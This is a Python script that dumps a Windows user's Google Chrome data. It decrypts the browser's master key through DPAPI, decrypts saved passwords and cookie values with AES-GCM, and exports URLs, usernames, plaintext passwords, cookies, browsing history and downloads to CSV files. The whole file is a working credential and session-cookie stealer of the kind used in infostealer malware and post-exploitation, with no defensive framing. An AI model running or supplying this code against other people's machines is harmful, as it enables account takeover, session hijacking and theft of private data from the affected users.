#!/usr/bin/env python3
# v0.3

import os
import csv
import time
import json
import base64
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_value(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode() # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Error!"

def decrypt_value_all_version(encrypted_value):
    master_key = get_master_key()
    if encrypted_value[0:3] == b'v10':
        # Chrome > 80
        decrypted_value = decrypt_value(encrypted_value, master_key)
    else:
        # Chrome < 80
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
    return decrypted_value

def timeStamp2time(timestamp):
    timestamp = timestamp // 1000000 - 11644473600
    if timestamp > 0:
        timeArray = time.localtime(timestamp)
        otherStyleTime = time.strftime("%Y-%m-%d %H:%M:%S", timeArray)
        return otherStyleTime
    else:
        return "Unknown"

def read_db(csv_path, csv_head, sql):
    conn = sqlite3.connect("temp")
    cursor = conn.cursor()
    with open(csv_path, 'w', newline = '', encoding = "utf-8-sig") as csv_file:
        try:
            cursor.execute(sql)
            csvwriter = csv.writer(csv_file, dialect=("excel"))
            csvwriter.writerow(csv_head)
            data = []
            for r in cursor.fetchall():
                for i in range(0, len(csv_head)):
                    if type(r[i]) == type(114514) and r[i] > 10000000000000000:
                        data.append((timeStamp2time(r[i])))
                    elif type(r[i]) == type(114514) and r[i] < 10000000000000000:
                        data.append(r[i]/1024/1024)
                    elif type(r[i]) == type(b"Aquilao"):
                        data.append(decrypt_value_all_version(r[i]))
                    else:
                        data.append(r[i])
                csvwriter.writerow(data)
                data = []
        except Exception as e:
            print(e)
    cursor.close()
    conn.close()
    try:
        os.remove("temp")
    except Exception as e:
        pass

def get_data(db_path, csv_path, csv_head, sql):
    target_db = os.environ['USERPROFILE'] + os.sep + db_path
    shutil.copy2(target_db, "temp")
    print("[+] Get Chrome Data From " + target_db)
    read_db(csv_path, csv_head, sql)
    print("[*] Output In " + os.getcwd() + "\\" + csv_path)

def main():
    # Target File Path
    TARGET_FILE_PATH = {
        "CHROME_PASSWORDS_DB_PATH"    : r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "CHROME_COOKIES_DB_PATH"     : r"AppData\Local\Google\Chrome\User Data\Default\Cookies",
        "CHROME_HISTORY_DB_PATH"     : r"AppData\Local\Google\Chrome\User Data\Default\History",
        "CHROME_BOOKMARKS_FILE_PATH" : r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    }
    # Result File Path
    RESULT_FILE_PATH = {
        "CHROME_PASSWORD_CSV_PATH"  : "Chrome_password.csv",
        "CHROME_COOKIES_CSV_PATH"   : "Chrome_cookies.csv",
        "CHROME_HISTORY_CSV_PATH"   : "Chrome_history.csv",
        "CHROME_BOOKMARKS_CSV_PATH" : "Chrome_bookmarks.csv",
        "CHROME_DOWNLOADS_CSV_PATH" : "Chrome_downloads.csv"
    }
    # Csv File Head
    CSV_FILE_HEAD = {
        "PASSOWRDS_CSV_HEAD" : ["url", "username", "password"],
        "COOKIES_CSV_HEAD"   : ["domain", "name", "cookies"],
        "HISTORY_CSV_HEAD"   : ["url", "title", "visit count", "last visit time"],
        "DOWNLOADS_CSV_HEAD" : ["target path", "url", "size(MB)", "start time", "end time"]
    }
    # Sql
    SQL = {
        "LOGIN_DATA_SQL" : "SELECT origin_url, username_value, password_value FROM logins;",
        "COOKIES_SQL"    : "SELECT host_key, name, encrypted_value FROM cookies;",
        "HISTORY_SQL"    : "SELECT url, title, visit_count, last_visit_time FROM urls;",
        "DOWNLOADS_SQL"   : "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
    }
    # Get Chrome Password
    get_data(TARGET_FILE_PATH["CHROME_PASSWORDS_DB_PATH"], RESULT_FILE_PATH["CHROME_PASSWORD_CSV_PATH"], CSV_FILE_HEAD["PASSOWRDS_CSV_HEAD"], SQL["LOGIN_DATA_SQL"])
    # Get Chrome Cookies
    get_data(TARGET_FILE_PATH["CHROME_COOKIES_DB_PATH"], RESULT_FILE_PATH["CHROME_COOKIES_CSV_PATH"], CSV_FILE_HEAD["COOKIES_CSV_HEAD"], SQL["COOKIES_SQL"])
    # Get History
    get_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_HISTORY_CSV_PATH"], CSV_FILE_HEAD["HISTORY_CSV_HEAD"], SQL["HISTORY_SQL"])
    # Get Download History
    get_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_DOWNLOADS_CSV_PATH"], CSV_FILE_HEAD["DOWNLOADS_CSV_HEAD"], SQL["DOWNLOADS_SQL"])



if __name__ == '__main__':
    main()